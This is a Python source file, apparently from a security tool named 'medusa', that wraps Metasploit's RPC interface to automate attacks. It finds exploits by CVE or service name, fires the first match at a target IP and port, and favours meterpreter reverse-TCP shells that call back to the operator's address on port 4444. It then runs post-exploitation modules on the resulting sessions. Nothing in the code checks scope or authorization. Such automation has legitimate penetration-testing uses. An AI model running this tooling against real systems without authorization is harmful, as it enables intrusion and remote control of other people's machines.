"""
Metasploit Connector
High-level interface for Metasploit operations
"""

from typing import Dict, Any, List, Optional
import logging
from pathlib import Path

from medusa.tools.metasploit import MetasploitRPC


class MetasploitConnector:
    """
    High-level Metasploit connector

    Provides simplified interface for common operations:
    - CVE to exploit mapping
    - Automatic payload selection
    - Session management
    - Post-exploitation
    """

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        Initialize Metasploit Connector

        Args:
            config: Metasploit configuration
        """
        config = config or {}

        self.rpc = MetasploitRPC(
            host=config.get("host", "127.0.0.1"),
            port=config.get("port", 55553),
            username=config.get("username", "msf"),
            password=config.get("password", ""),
            ssl=config.get("ssl", False)
        )

        self.logger = logging.getLogger(__name__)
        self.connected = False

    def connect(self) -> bool:
        """Connect to Metasploit"""
        self.connected = self.rpc.connect()
        return self.connected

    def disconnect(self):
        """Disconnect from Metasploit"""
        self.rpc.disconnect()
        self.connected = False

    def find_exploits_for_cve(self, cve_id: str) -> List[Dict[str, Any]]:
        """
        Find exploits for a CVE

        Args:
            cve_id: CVE identifier (e.g., "CVE-2021-44228")

        Returns:
            List of applicable exploits
        """
        self.logger.info(f"Searching exploits for {cve_id}")

        # Search by CVE
        exploits = self.rpc.search_exploits(cve_id, type_filter="exploit")

        return exploits

    def find_exploits_for_service(
        self,
        service: str,
        version: Optional[str] = None
    ) -> List[Dict[str, Any]]:
        """
        Find exploits for a service

        Args:
            service: Service name (e.g., "smb", "apache")
            version: Service version (optional)

        Returns:
            List of applicable exploits
        """
        query = service
        if version:
            query += f" {version}"

        self.logger.info(f"Searching exploits for service: {query}")

        exploits = self.rpc.search_exploits(query, type_filter="exploit")

        return exploits

    def auto_exploit(
        self,
        target_ip: str,
        target_port: int,
        exploit_name: Optional[str] = None,
        cve_id: Optional[str] = None,
        service: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Automatically exploit a target

        Args:
            target_ip: Target IP address
            target_port: Target port
            exploit_name: Specific exploit to use (optional)
            cve_id: CVE to exploit (optional)
            service: Service name (optional)

        Returns:
            Exploitation result
        """
        # Find exploit if not specified
        if not exploit_name:
            if cve_id:
                exploits = self.find_exploits_for_cve(cve_id)
            elif service:
                exploits = self.find_exploits_for_service(service)
            else:
                return {"error": "Must specify exploit_name, cve_id, or service"}

            if not exploits:
                return {"error": "No exploits found"}

            # Use first exploit
            exploit_name = exploits[0]["name"]
            self.logger.info(f"Using exploit: {exploit_name}")

        # Get exploit info
        exploit_info = self.rpc.get_module_info(exploit_name)

        if not exploit_info:
            return {"error": f"Failed to get info for {exploit_name}"}

        # Determine payload
        payload = self._select_payload(exploit_info, target_ip)

        # Set up options
        options = {
            "RHOST": target_ip,
            "RPORT": target_port,
        }

        payload_options = {}
        if payload:
            # Get attacker IP (simplified - should be configurable)
            payload_options = {
                "LHOST": self._get_local_ip(),
                "LPORT": "4444",
            }

        # Execute exploit
        result = self.rpc.execute_exploit(
            exploit_name,
            options,
            payload,
            payload_options
        )

        return result

    def run_post_exploit_module(
        self,
        session_id: str,
        module_name: str,
        options: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """
        Run post-exploitation module

        Args:
            session_id: Session ID
            module_name: Post module name
            options: Module options

        Returns:
            Module output
        """
        options = options or {}
        options["SESSION"] = session_id

        # Create console and run module
        console = self.rpc.create_console()
        console_id = console.get("id")

        cmd = f"use {module_name}\n"
        for key, value in options.items():
            cmd += f"set {key} {value}\n"
        cmd += "run\n"

        self.rpc.write_console(console_id, cmd)

        import time
        time.sleep(3)

        output = self.rpc.read_console(console_id)
        self.rpc.destroy_console(console_id)

        return {"output": output.get("data", "")}

    def _select_payload(
        self,
        exploit_info: Dict[str, Any],
        target_ip: str
    ) -> Optional[str]:
        """
        Automatically select appropriate payload

        Args:
            exploit_info: Exploit module information
            target_ip: Target IP

        Returns:
            Payload name
        """
        # Get compatible payloads
        payloads = exploit_info.get("payloads", [])

        if not payloads:
            return None

        # Prioritize reverse shell payloads
        preferred_payloads = [
            "windows/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "cmd/unix/reverse",
        ]

        for preferred in preferred_payloads:
            if preferred in payloads:
                return preferred

        # Return first available payload
        return payloads[0]

    def _get_local_ip(self) -> str:
        """Get local IP address"""
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return "127.0.0.1"

    def __enter__(self):
        """Context manager entry"""
        self.connect()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit"""
        self.disconnect()
